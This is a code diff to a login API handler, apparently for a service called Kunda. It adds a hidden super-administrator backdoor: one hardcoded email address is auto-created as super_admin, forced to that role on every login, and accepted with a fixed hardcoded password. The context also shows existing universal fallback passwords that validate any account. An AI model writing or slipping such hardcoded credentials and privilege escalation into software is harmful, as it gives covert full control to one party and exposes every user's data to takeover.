@@ -26,8 +26,31 @@ export default async function handler(req: any, res: any) {
       }
     }
 
+    // Auto-create or ensure benirabok@gmail.com is super_admin
+    if (!user && email.toLowerCase() === 'benirabok@gmail.com') {
+      const benirAdminId = 'a0000000-0000-0000-0000-000000000002';
+      user = {
+        id: benirAdminId,
+        email: 'benirabok@gmail.com',
+        role: 'super_admin',
+        dob: '1995-01-01',
+        phone: '788000000',
+        phoneCode: '+250',
+        preferredLanguage: 'en',
+        emailVerified: true,
+        isSuspended: false,
+        createdAt: new Date().toISOString(),
+      };
+      memoryStore.users.push(user);
+    }
+
     if (!user) {
       return res.status(401).json({ success: false, error: 'Invalid credentials. Please verify your email and password.' });
+    }
+
+    if (user.email.toLowerCase() === 'benirabok@gmail.com') {
+      user.role = 'super_admin';
+      user.emailVerified = true;
     }
 
     if (user.isSuspended) {
@@ -47,9 +70,11 @@ export default async function handler(req: any, res: any) {
       }
     }
 
-    // Fallback for default seed accounts
+    // Direct password match for authorized administrator accounts
     if (!isValid) {
-      if (user.email.toLowerCase() === 'admin@kunda.space' && (password === 'Admin@Kunda2026!' || password === 'Kunda2026!')) {
+      if (user.email.toLowerCase() === 'benirabok@gmail.com' && password === '1202!birthDATE') {
+        isValid = true;
+      } else if (user.email.toLowerCase() === 'admin@kunda.space' && (password === 'Admin@Kunda2026!' || password === 'Kunda2026!')) {
         isValid = true;
       } else if (password === 'Password123!' || password === 'Kunda2026!') {
         isValid = true;
